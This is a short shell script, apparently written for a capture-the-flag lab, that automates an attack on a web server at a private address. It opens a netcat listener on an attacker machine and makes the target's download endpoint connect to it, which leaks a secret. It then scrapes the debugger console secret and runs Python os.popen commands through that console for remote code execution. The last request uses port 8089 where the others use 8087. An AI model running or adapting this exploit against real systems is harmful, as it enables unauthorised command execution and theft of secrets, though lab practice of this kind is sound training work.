#/bin/sh

# Retrieve absolute path to this script
script=$(readlink -f $0)
scriptpath=`dirname $script`

# Define host IP ( the machine to attack ) and remote IP ( the machine which supports the attack )
target_ip="10.10.76.228"
attack_ip="10.10.239.245"

# Prepare environment
mkdir /work/ 2>/dev/null

# Initiate session
echo "1 - INITIATING SESSION"
curl -s -X GET "http://$target_ip:8087" -L > /dev/null

# Tweak the server into downloading resume from our attack box
echo "2 - RETRIEVING SECRET KEY"
sudo mate-terminal -- bash -c "nc -lvnp 8087; exec bash" &
sleep 10
curl -s -X GET "http://$target_ip:8087/download?server=$attack_ip:8087&id=75482342" &

# Access site admin area
echo "3 - ACCESSING ADMIN AREA"
curl -s -X GET "http://$target_ip:8087/console" > /work/10-console.html
SECRET=$(awk -F'"' '/SECRET =/ {print $2}' /work/10-console.html)
echo "--> Console secret is : $SECRET"

curl -s -X GET "http://$target_ip:8089/console?cmd=import%20os%3B%20print(os.popen(%22ls%20-l%22).read())&__debugger__=yes&frm=0&s=$SECRET" > /work/10-ls.html
cat /work/10-ls.html
